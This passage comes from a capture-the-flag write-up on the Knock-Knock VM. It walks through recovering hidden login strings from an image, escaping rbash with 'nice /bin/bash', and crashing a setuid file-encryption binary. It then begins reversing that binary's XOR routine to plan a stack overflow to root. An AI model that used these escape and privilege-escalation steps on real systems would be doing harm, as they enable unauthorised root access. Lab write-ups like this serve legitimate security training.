&lt;p&gt;I know that I could test to see if say &lt;code&gt;tcp/22&lt;/code&gt; was open, but I went with the assumption that you don&amp;rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.&lt;/p&gt;

&lt;h2 id=&#34;may-i-burn-the-door-now&#34;&gt;may I burn the door now?&lt;/h2&gt;

&lt;p&gt;So, focus shifted to the web server at &lt;code&gt;tcp/80&lt;/code&gt;. Browsing to the web server presented us with the following:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/knock_knock_web.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like &lt;code&gt;wfuzz&lt;/code&gt; etc. With the hint &lt;em&gt;Gotta look harder&lt;/em&gt;, I decided to move my attention to the door image itself.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wget http://192.168.56.203/knockknock.jpg
--2014-10-14 13:04:34--  http://192.168.56.203/knockknock.jpg
Connecting to 192.168.56.203:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84741 (83K) [image/jpeg]
Saving to: `knockknock.jpg&#39;

100%[============&amp;gt;] 84,741      68.2K/s   in 1.2s

2014-10-14 13:04:35 (68.2 KB/s) - `knockknock.jpg&#39; saved [84741/84741]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I will admit that I was not very keen on the idea that something may be stego&amp;rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.&lt;/p&gt;

&lt;p&gt;Next, I ran the image through exiftool:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
ExifTool Version Number         : 8.60
File Name                       : knockknock.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2014:10:06 18:38:30+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Quality                         : 74%
XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
Marked                          : © Estate of Roy Lichtenstein
Web Statement                   : © Estate of Roy Lichtenstein
Rights                          : © Estate of Roy Lichtenstein
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 650
Image Height                    : 788
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 650x788
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Roy Lichtenstein. The artist of the knock knock image?
Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.&lt;/p&gt;

&lt;p&gt;My idea was to try and recover the jpeg data from &lt;code&gt;knockknock.jpg&lt;/code&gt; using &lt;code&gt;recoverjpeg&lt;/code&gt;, and then compare the resulting image with the original and check for any differences.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# extract the jpeg data
root@kali:~# recoverjpeg knockknock.jpg
Restored 1 picture

# the output image from the extract
root@kali:~# ls image00000.jpg
image00000.jpg

# the cmp
root@kali:~# cmp image00000.jpg knockknock.jpg
cmp: EOF on image00000.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tail -n 1 image00000.jpg
9��&amp;lt;V ��v�ܫQqRJ5U�&amp;lt;��W�V9`��5BV(��&amp;lt;�t�WS�����1h
                                                         ��\���z$���vB��
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As expected, junk :P Lets look at &lt;code&gt;knockknock.jpeg&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tail -n 4 knockknock.jpg
⭚|U���b��[�k|U�������+\U����]�U¸��qW|U�]�qWX�F��*��kz����]��ѭqV�k튷�P���b��T�\+\U��Wo��9b�&amp;lt;�V��]���B��[�v*�Uثx�X�x�[����o������|U����v*�^��x��Wb�o���b��b��[����qU����צ*����*���qW�
Login Credentials
abfnW
sax2Cw9Ow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hah! Login Credentials sound very promising!! :)&lt;/p&gt;

&lt;h2 id=&#34;ceasar-opens-the-door&#34;&gt;ceasar opens the door&lt;/h2&gt;

&lt;p&gt;After finding the hidden strings in the jpeg, I came to a quick realization that &lt;code&gt;abfnW:sax2Cw9Ow&lt;/code&gt; was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.&lt;/p&gt;

&lt;p&gt;I tried to browse to the paths in the web server such as &lt;code&gt;abfnW/&lt;/code&gt; and &lt;code&gt;sax2Cw9Ow/&lt;/code&gt;, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.&lt;/p&gt;

&lt;p&gt;Turns out, the strings were encoded using a Ceasar Cipher (&lt;a href=&#34;http://en.wikipedia.org/wiki/Caesar_cipher&#34;&gt;ROT13&lt;/a&gt;). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with &lt;strong&gt;abfnW&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;abfnW&amp;quot;.decode(&amp;quot;rot13&amp;quot;)&#39;
nosaJ
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;abfnW decoded directly to &lt;strong&gt;nosaJ&lt;/strong&gt;. That is &lt;em&gt;Jason&lt;/em&gt; reversed. So is the username &lt;code&gt;Jason&lt;/code&gt;? Next, I tackled &lt;code&gt;sax2Cw9Ow&lt;/code&gt; in a similar fashion:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;sax2Cw9Ow&amp;quot;.decode(&amp;quot;rot13&amp;quot;)&#39;
fnk2Pj9Bj
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sax2Cw9Ow decodes to &lt;strong&gt;fnk2Pj9Bj&lt;/strong&gt;. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is &lt;strong&gt;jason&lt;/strong&gt; (without the cap &lt;em&gt;J&lt;/em&gt;) and the password is &lt;strong&gt;fnk2Pj9Bj&lt;/strong&gt; (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# username
root@kali:~# python -c &#39;print &amp;quot;abfnW&amp;quot;.decode(&amp;quot;rot13&amp;quot;)[::-1].lower()&#39;
jason

# password
root@kali:~# python -c &#39;print &amp;quot;sax2Cw9Ow&amp;quot;.decode(&amp;quot;rot13&amp;quot;)[::-1]&#39;
jB9jP2knf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So to get our first shell:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/knock-knock# ssh jason@192.168.56.203
jason@192.168.56.203&#39;s password:

Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;no-rbash-just-no&#34;&gt;no rbash, just no&lt;/h2&gt;

&lt;p&gt;Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ -rbash: /dev/null: restricted: cannot redirect output
-rbash: /dev/null: restricted: cannot redirect output
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Rbash? Oh well thats ok. I checked by inspecting the env var for &lt;code&gt;SHELL&lt;/code&gt; which was &lt;code&gt;/bin/rbash&lt;/code&gt; just to confirm. Thanks to having recently met a similar situation during the &lt;a href=&#34;https://leonjza.github.io/blog/2014/09/18/from-persistence/&#34;&gt;Persistence&lt;/a&gt; boot2root and learning new ways of breaking out of &lt;code&gt;rbash&lt;/code&gt;, I just typed &lt;code&gt;nice /bin/bash&lt;/code&gt;, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full &lt;code&gt;bash&lt;/code&gt; shell.&lt;/p&gt;

&lt;h2 id=&#34;tiny-file-crypter&#34;&gt;tiny file crypter&lt;/h2&gt;

&lt;p&gt;Some quick initial enumeration did not reveal anything particularly interesting. In &lt;code&gt;jason&lt;/code&gt;&amp;rsquo;s home folder though was a file called &lt;code&gt;tfc&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ ls -lah
total 32K
drwxr-xr-x 2 jason jason 4.0K Oct 11 18:51 .
drwxr-xr-x 3 root  root  4.0K Sep 24 21:03 ..
lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 jason jason  220 Sep 24 21:03 .bash_logout
-rw-r--r-- 1 jason jason 3.4K Sep 25 21:58 .bashrc
-rw-r--r-- 1 jason jason  675 Sep 24 21:03 .profile
-rwsr-xr-x 1 root  jason 7.3K Oct 11 18:35 tfc
-rw------- 1 jason jason 2.4K Oct 11 18:42 .viminfo

jason@knockknock:~$ ./tfc
_______________________________
\__    ___/\_   _____/\_   ___ \
  |    |    |    __)  /    \  \/
  |    |    |     \   \     \____
  |____|    \___  /    \______  /
                \/            \/

    Tiny File Crypter - 1.0

Usage: ./tfc &amp;lt;filein.tfc&amp;gt; &amp;lt;fileout.tfc&amp;gt;
jason@knockknock:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;Tiny File Crypter&lt;/em&gt; appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the &lt;code&gt;setuid&lt;/code&gt; bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.&lt;/p&gt;

&lt;p&gt;Some important observations about &lt;code&gt;tfc&lt;/code&gt; during the first bits of testing; Input and output files must have the &lt;code&gt;.tfc&lt;/code&gt; extension. &lt;code&gt;tfc&lt;/code&gt; does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by &lt;code&gt;tfc&lt;/code&gt;. Considering its run as root, that probably wont be a problem.&lt;/p&gt;

&lt;p&gt;A sample encryption run can be seen as:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# we have a source document
jason@knockknock:~$ cat test.tfc
This is a test document.

# we run the encryption program over it
jason@knockknock:~$ ./tfc test.tfc crypt.tfc
&amp;gt;&amp;gt; File crypted, goodbye!

# dump the encrypted file as hex. from the ascii we
# can see its no longer human readable
jason@knockknock:~$ xxd crypt.tfc
0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&amp;lt;..&amp;quot;&amp;amp;..@^.jm
0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j

# the resulting file is owned by root
jason@knockknock:~$ ls -l crypt.tfc
-rw-r--r-- 1 root jason 25 Oct 14 08:12 crypt.tfc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, there is one very important finding. We can reverse the encrypted file by simply running it through &lt;code&gt;tfc&lt;/code&gt; again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ ./tfc crypt.tfc reversed.tfc
&amp;gt;&amp;gt; File crypted, goodbye!

jason@knockknock:~$ cat reversed.tfc
This is a test document.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is &lt;a href=&#34;http://en.wikipedia.org/wiki/Symmetric-key_algorithm&#34;&gt;symmetric&lt;/a&gt; using the same key for encryption and decryption.&lt;/p&gt;

&lt;p&gt;But ok. That actually means nothing now. It also definitely does not tell us how to break &lt;code&gt;tfc&lt;/code&gt; either!&lt;/p&gt;

&lt;h2 id=&#34;fuzzing-disassembling-tfc&#34;&gt;fuzzing &amp;amp; disassembling tfc&lt;/h2&gt;

&lt;p&gt;With all of the information gathered thus far about &lt;code&gt;tfc&lt;/code&gt;, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override &lt;code&gt;/etc/shadow&lt;/code&gt; to replace &lt;code&gt;root&lt;/code&gt;s password, or replace &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the &lt;code&gt;.tfc&lt;/code&gt; extension.&lt;/p&gt;

&lt;p&gt;By now it became very apparent that we have to bring &lt;code&gt;tfc&lt;/code&gt; under the microscope and have a closer look at what is happening inside. The first step was to run &lt;code&gt;tfc&lt;/code&gt; through &lt;code&gt;strings&lt;/code&gt; and check the output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ strings tfc
/lib/ld-linux.so.2

[... snip ...]

[^_]
    Tiny File Crypter - 1.0
Usage: ./tfc &amp;lt;filein.tfc&amp;gt; &amp;lt;fileout.tfc&amp;gt;
&amp;gt;&amp;gt; Filenames need a .tfc extension
&amp;gt;&amp;gt; No symbolic links!
&amp;gt;&amp;gt; Failed to open input file
&amp;gt;&amp;gt; Failed to create the output file
&amp;gt;&amp;gt; File crypted, goodbye!
;*2$&amp;quot;
_______________________________
\__    ___/\_   _____/\_   ___ \
  |    |    |    __)  /    \  \/
  |    |    |     \   \     \____
  |____|    \___  /    \______  /
                \/            \/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D&lt;/p&gt;

&lt;p&gt;I figured I needed to get &lt;code&gt;tfc&lt;/code&gt; into &lt;code&gt;gdb&lt;/code&gt; and inspect it further there, however this VM did not have &lt;code&gt;gdb&lt;/code&gt; installed. So, I copied it off the VM onto my Kali Linux install and plugged it into &lt;code&gt;gdb&lt;/code&gt;. Then, to get an idea of what its doing, I started to disassemble it, starting with &lt;code&gt;main&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048924 &amp;lt;+0&amp;gt;: push   ebp
   0x08048925 &amp;lt;+1&amp;gt;: mov    ebp,esp

   [... snip ...]

   0x0804894e &amp;lt;+42&amp;gt;:    mov    DWORD PTR [esp],eax
   0x08048951 &amp;lt;+45&amp;gt;:    call   0x80486e6 &amp;lt;cryptFile&amp;gt;    #&amp;lt;---
   0x08048956 &amp;lt;+50&amp;gt;:    test   eax,eax

   [... snip ...]

   0x0804896c &amp;lt;+72&amp;gt;:    ret
End of assembler dump.
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After some initial setup work and argument checks we notice a call to a function called &lt;code&gt;cryptFile&lt;/code&gt;. So the next logical step was to check what happening in that function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass cryptFile
Dump of assembler code for function cryptFile:
   0x080486e6 &amp;lt;+0&amp;gt;: push   ebp
   0x080486e7 &amp;lt;+1&amp;gt;: mov    ebp,esp
   0x080486e9 &amp;lt;+3&amp;gt;: sub    esp,0x1088

   [... snip ...]

   0x080488a8 &amp;lt;+450&amp;gt;:   mov    DWORD PTR [esp],eax
   0x080488ab &amp;lt;+453&amp;gt;:   call   0x8048618 &amp;lt;xcrypt&amp;gt;       #&amp;lt;---
   0x080488b0 &amp;lt;+458&amp;gt;:   mov    eax,DWORD PTR [ebp-0x14]

   [... snip ...]

   0x08048922 &amp;lt;+572&amp;gt;:   leave
   0x08048923 &amp;lt;+573&amp;gt;:   ret
End of assembler dump.
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;crytFile&lt;/code&gt; does some internal &lt;em&gt;things&lt;/em&gt; (like &lt;code&gt;call   0x80484a0 &amp;lt;open@plt&amp;gt;&lt;/code&gt; opening the file?) and eventually calls a function &lt;code&gt;xcrypt&lt;/code&gt;. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of &lt;code&gt;xor&lt;/code&gt; calls it had. Of course, this is only a guess and I may have missed something else completely.&lt;/p&gt;

&lt;p&gt;I also checked out the security features this binary was compiled with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Woa. &lt;strong&gt;No&lt;/strong&gt; security? Ok&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;we-knocked-and-tfc-opened-the-door-to-bof&#34;&gt;we knocked and tfc opened the door to bof&lt;/h2&gt;

&lt;p&gt;The disassembly of &lt;code&gt;tfc&lt;/code&gt; did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)&lt;/p&gt;

&lt;p&gt;So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# create a file of roughly 2MB
root@kali:~# dd if=/dev/urandom of=large.tfc bs=1M count=2
2+0 records in
2+0 records out
2097152 bytes (2.1 MB) copied, 0.132812 s, 15.8 MB/s

# confirm the size of the file
root@kali:~# ls -lh large.tfc
-rw-r--r-- 1 root root 2.0M Oct 14 15:01 large.tfc

# check how many characters we have in the file
root@kali:~# wc -c large.tfc
2097152 large.tfc

# attempt encryption
root@kali:~# ./tfc large.tfc out.tfc
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;Segmentation fault&lt;/em&gt;! Being able to crash &lt;code&gt;tfc&lt;/code&gt; is really good news. I went on to test just how many characters were needed to crash &lt;code&gt;tfc&lt;/code&gt; in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in &lt;code&gt;gdb&lt;/code&gt;. I first prepared a new file with just &amp;ldquo;A&amp;rdquo; in it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# echo -n $(python -c &#39;print &amp;quot;A&amp;quot;*6000&#39;) &amp;gt; gdb-test.tfc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And continued to run it in &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc...(no debugging symbols found)...done.
gdb-peda$ r gdb-test.tfc gdb-test-out.tfc

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fbfff4 --&amp;gt; 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&#39;\t&#39;)
ESI: 0x0
EDI: 0x0
EBP: 0xc55193b
ESP: 0xbffff3c0 (&amp;quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&amp;lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&amp;gt;\001\330Zn\242T\273wO\245uK\251\364?&amp;gt;\362\005$1\016k\371\035\&amp;quot;\030}x\367\177\320&amp;amp;e:\202\030)\316\337/&amp;lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&amp;gt;\335#S@&amp;amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&amp;quot;...)
EIP: 0x675c916
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x675c916
[------------------------------------stack-------------------------------------]
0000| 0xbffff3c0 (&amp;quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&amp;lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&amp;gt;\001\330Zn\242T\273wO\245uK\251\364?&amp;gt;\362\005$1\016k\371\035\&amp;quot;\030}x\367\177\320&amp;amp;e:\202\030)\316\337/&amp;lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&amp;gt;\335#S@&amp;amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&amp;quot;...)
0004| 0xbffff3c4 --&amp;gt; 0x5e43a802
0008| 0xbffff3c8 --&amp;gt; 0x3d9cc67a
0012| 0xbffff3cc --&amp;gt; 0x4050608c
0016| 0xbffff3d0 (&amp;quot;JH\\/Ux7;&amp;lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&amp;gt;\001\330Zn\242T\273wO\245uK\251\364?&amp;gt;\362\005$1\016k\371\035\&amp;quot;\030}x\367\177\320&amp;amp;e:\202\030)\316\337/&amp;lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&amp;gt;\335#S@&amp;amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&amp;quot;l\311+\203˃&amp;amp;\322t\217 &amp;quot;...)
0020| 0xbffff3d4 (&amp;quot;Ux7;&amp;lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&amp;gt;\001\330Zn\242T\273wO\245uK\251\364?&amp;gt;\362\005$1\016k\371\035\&amp;quot;\030}x\367\177\320&amp;amp;e:\202\030)\316\337/&amp;lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&amp;gt;\335#S@&amp;amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&amp;quot;l\311+\203˃&amp;amp;\322t\217 BG\202\006&amp;quot;...)
0024| 0xbffff3d8 --&amp;gt; 0x5489a33c
0028| 0xbffff3dc --&amp;gt; 0x3997552a
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0675c916 in ?? ()
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ow. Ok, so we don&amp;rsquo;t crash with a clean &lt;em&gt;0x41414141&lt;/em&gt; as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.&lt;/p&gt;

&lt;h2 id=&#34;planning-a-exploit&#34;&gt;planning a exploit&lt;/h2&gt;

&lt;p&gt;So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs &lt;strong&gt;after&lt;/strong&gt; the encryption function (remember &lt;code&gt;xcrypt&lt;/code&gt;?) has run and wants to write the output to file (this is an assumption though).&lt;/p&gt;

&lt;p&gt;Ok. So. Make sure you focus now :)&lt;/p&gt;

&lt;p&gt;We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our &lt;em&gt;A&lt;/em&gt; buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our &lt;em&gt;A&lt;/em&gt; buffer as we have just observed it crash before the output is written.&lt;/p&gt;

&lt;p&gt;So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our &lt;em&gt;A&lt;/em&gt; buffer long enough, then we can feed that to &lt;code&gt;tfc&lt;/code&gt; and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering &lt;code&gt;tfc&lt;/code&gt; had no security as part of the compilation, maybe execute some shell code on the stack.&lt;/p&gt;

&lt;p&gt;Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in &lt;code&gt;xcrypt()&lt;/code&gt; to get started. Something I have practically 0 experience in.&lt;/p&gt;

&lt;h2 id=&#34;reversing-xcrypt&#34;&gt;reversing xcrypt()&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;For this part, I have to give a &lt;strong&gt;big&lt;/strong&gt; high five to &lt;a href=&#34;https://twitter.com/recrudesce&#34;&gt;@recrudesce&lt;/a&gt; for helping me understand parts of the pseudo code.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Right. Essentially, in order for us to better understand what exactly is happening within &lt;code&gt;xcrypt()&lt;/code&gt;, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its &lt;em&gt;reaaaaaly&lt;/em&gt; hard to comprehend), but it &lt;em&gt;really&lt;/em&gt; helps in getting the mind to understand the flow.&lt;/p&gt;

&lt;p&gt;For the pseudo code, I downloaded a demo version of &lt;a href=&#34;http://www.hopperapp.com/&#34;&gt;Hopper&lt;/a&gt;. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded &lt;code&gt;tfc&lt;/code&gt;, located the &lt;code&gt;xcrypt()&lt;/code&gt; function and slapped the Pseudo code generation button:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/knock_knock_hopper_pseudo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;While looking around for pseudo code generation options, I came across the &lt;a href=&#34;http://decompiler.fit.vutbr.cz/decompilation/&#34;&gt;Retargetable Decompiler&lt;/a&gt; online service, which had the following image as a control flow graph for the calls in &lt;code&gt;xcrypt()&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/knock_knock_crypter_control_flow.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Armed this this graph and the pseudo code, I was ready to start writing a python version of it.&lt;/p&gt;

&lt;p&gt;I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int xcrypt(int arg0, int arg1) {
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We start by declaring the fuction &lt;code&gt;xcrypt()&lt;/code&gt;. &lt;code&gt;xcrypt()&lt;/code&gt; takes 2 arguments. From inspecting the the parent function &lt;code&gt;cryptFile()&lt;/code&gt; that calls &lt;code&gt;xcrypt()&lt;/code&gt;, we can see the 2 arguments passed to &lt;code&gt;xcrypt()&lt;/code&gt; is the file content and the length of the content respectively. So, &lt;code&gt;arg0&lt;/code&gt; is the content and &lt;code&gt;arg1&lt;/code&gt; is the content length.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    var_C = 0xea1ab19f;
    var_10 = arg_0;
    var_4 = 0x0;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we have 3 variable assignments occur. &lt;code&gt;var_C&lt;/code&gt; is set to &lt;code&gt;0xea1ab19f&lt;/code&gt;, &lt;code&gt;var_10&lt;/code&gt; is set to the file content from &lt;code&gt;arg0&lt;/code&gt; and &lt;code&gt;var_4&lt;/code&gt; is set to 0.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    while (arg_4 &amp;gt;&amp;gt; 0x2 &amp;gt; var_4) {
            *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This part has one bit that may be very confusing. Comparing this to other output from say IDA and &lt;a href=&#34;http://decompiler.fit.vutbr.cz/decompilation/&#34;&gt;Retargetable Decompiler&lt;/a&gt;, we will see that the &lt;code&gt;arg_4&lt;/code&gt; referred to here is actually the length of the content, so &lt;code&gt;arg1&lt;/code&gt; then.&lt;/p&gt;

&lt;p&gt;With that out the way, we see the start of a while loop for &lt;code&gt;arg_4 &amp;gt;&amp;gt; 0x2&lt;/code&gt;, which translates to &lt;code&gt;len(content) &amp;gt;&amp;gt; 2&lt;/code&gt;, which essentially just means &lt;code&gt;len(content) / 4&lt;/code&gt;. While the output of this bitwise right shift is larger than &lt;code&gt;var_4&lt;/code&gt;, which is 0 at the start, the loop will continue.&lt;/p&gt;

